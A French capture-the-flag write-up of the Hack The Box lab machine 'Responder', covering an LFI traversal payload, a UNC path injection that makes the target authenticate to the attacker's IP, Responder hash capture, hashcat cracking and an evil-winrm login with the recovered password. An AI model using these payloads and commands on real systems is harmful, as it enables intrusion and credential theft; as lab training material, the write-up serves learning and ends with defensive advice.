# Responder — HTB Starting Point (Tier 1)

| | |
|---|---|
| **Section** | Starting Point — Tier 1 |
| **Machine** | `Responder` |
| **OS** | Windows |
| **IP cible** | `10.129.160.109` *(change à chaque spawn)* |
| **Difficulté** | Very Easy |
| **Date** | 2026-11-02 |
| **Résultat** | flag ✅ |

---

## TL;DR — chaîne d'attaque (LFI → vol de hash → crack → WinRM)

```
nmap  →  80 HTTP (Apache Win64, PHP 8.1.1)   [+ 5985 WinRM]
      →  site redirige vers unika.htb  →  ajout dans /etc/hosts
      →  parametre ?page=... vulnerable : LFI (Local File Inclusion)
      →  inclusion d'un chemin UNC \\MON_IP\x  →  la cible s'authentifie chez moi
      →  responder capture le hash NTLMv2 de Administrator
      →  hashcat -m 5600 (rockyou)  →  mot de passe : badminton
      →  evil-winrm administrator:badminton (port 5985)  →  flag
```

---

## 1. Reconnaissance

```bash
box responder <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP
```

| Port | Service | Détail |
|---|---|---|
| 80/tcp | http | Apache 2.4.52 **Win64** OpenSSL PHP 8.1.1 |
| 5985/tcp | WinRM | (service d'admin Windows — pas dans le scan par défaut, mais actif) |

`Win64` + `PHP` → cible **Windows** avec appli PHP. À retenir : l'OS change l'exploitation (chemins `\`, hash NTLM, WinRM).

**Résolution de nom** : le site renvoie vers `unika.htb`. On mappe le nom sur l'IP :

```bash
echo "$IP unika.htb" >> /etc/hosts
# puis http://unika.htb dans Firefox (make gui)
```

---

## 2. LFI (Local File Inclusion)

Le sélecteur de langue du site utilise un paramètre `?page=` :

```
http://unika.htb/index.php?page=french.html
```

Il **inclut un fichier d'après l'URL** → on teste l'inclusion d'un fichier système (chemins Windows) :

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

Le contenu du fichier s'affiche → **LFI confirmée**.

**Le concept :** une LFI inclut un fichier choisi par l'utilisateur. Sans filtrage, on remonte l'arborescence (`../`) pour lire des fichiers sensibles.

---

## 3. Le twist Windows — vol du hash NTLMv2

Sur Windows, PHP peut inclure un **chemin réseau UNC** (`\\serveur\partage`). En pointant l'inclusion vers **ma** machine, je force la cible à **s'authentifier chez moi** en SMB → je capture son hash.

```bash
# Terminal 1 : écoute SMB/HTTP et capture les auth
responder -I tun0
```
```
# Terminal 2 (ou navigateur) : declenche l'auth vers MON IP VPN (myip)
http://unika.htb/index.php?page=//10.10.17.56/x
```

Responder affiche alors :

```
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1122334455...:....
```

→ **hash NTLMv2 du compte Administrator capturé.** (Sauvegardé aussi dans `/usr/share/responder/logs/`.)

---

## 4. Crack + accès WinRM

```bash
echo 'Administrator::RESPONDER:....(ligne complete)....' > loot/ntlm.hash
hashcat -m 5600 loot/ntlm.hash $ROCKYOU        # NTLMv2 = mode 5600
hashcat -m 5600 loot/ntlm.hash $ROCKYOU --show # -> ...:badminton
```

**Mot de passe trouvé : `badminton`.**

Connexion via **WinRM (port 5985)** avec `evil-winrm` :

```bash
evil-winrm -i $IP -u administrator -p 'badminton'
```
```powershell
type C:\Users\mike\Desktop\flag.txt
# si besoin : Get-ChildItem C:\Users -Recurse -Filter flag.txt -ErrorAction SilentlyContinue
```

---

## 5. Leçons à retenir

- **LFI** : tout paramètre qui charge un fichier (`?page=`, `?file=`, `?lang=`) est suspect. Tester `../` et des fichiers système connus.
- **Vhosts / `/etc/hosts`** : une appli peut exiger son **nom de domaine** (`unika.htb`) pour répondre correctement. Mapper nom→IP dans `/etc/hosts` est un réflexe web.
- **LFI → UNC sur Windows** : inclure `\\MON_IP\x` force la cible à s'authentifier chez l'attaquant → capture de hash NTLMv2 avec **responder**. Technique Windows très courante (aussi via `\\IP\share` dans mille autres contextes).
- **Cracker NTLMv2** : hashcat mode **5600** (ou john), wordlist rockyou.
- **WinRM = accès shell Windows** : port **5985**, exploité avec **evil-winrm** une fois des creds valides en main.
- **Défense** : jamais d'inclusion de fichier basée sur une entrée utilisateur (liste blanche), et bloquer les connexions SMB sortantes.

---

## Commandes — récap express

```bash
box responder <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP
echo "$IP unika.htb" >> /etc/hosts
# LFI test : http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts
responder -I tun0
# declenche : http://unika.htb/index.php?page=//$(myip)/x   -> capture hash
hashcat -m 5600 loot/ntlm.hash $ROCKYOU --show               # -> badminton
evil-winrm -i $IP -u administrator -p 'badminton'            # -> flag (5985)
```
